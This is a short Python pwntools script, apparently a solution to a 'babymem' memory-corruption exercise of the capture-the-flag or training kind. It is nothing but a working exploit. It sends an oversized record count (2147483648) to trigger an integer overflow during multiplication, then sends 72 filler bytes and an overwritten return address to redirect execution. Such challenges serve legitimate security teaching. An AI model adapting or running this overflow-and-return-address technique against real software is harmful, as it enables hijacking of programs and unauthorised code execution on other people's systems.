from pwn import *

# 2147483648
# Integer Overflow during imul

p = process("./babymem-level-5-1")

payload = b""
payload += b"A" * 72
payload += p64(0x401a3c)

p.recvuntil(b"Number of payload records to send: ")
p.sendline(b"2147483648")

p.recvuntil(b"Size of each payload record: ")
p.sendline(b"2")

p.recvuntil(b"Send your payload (up to 4294967296 bytes)!\n")
p.sendline(payload)

print(p.recvall())
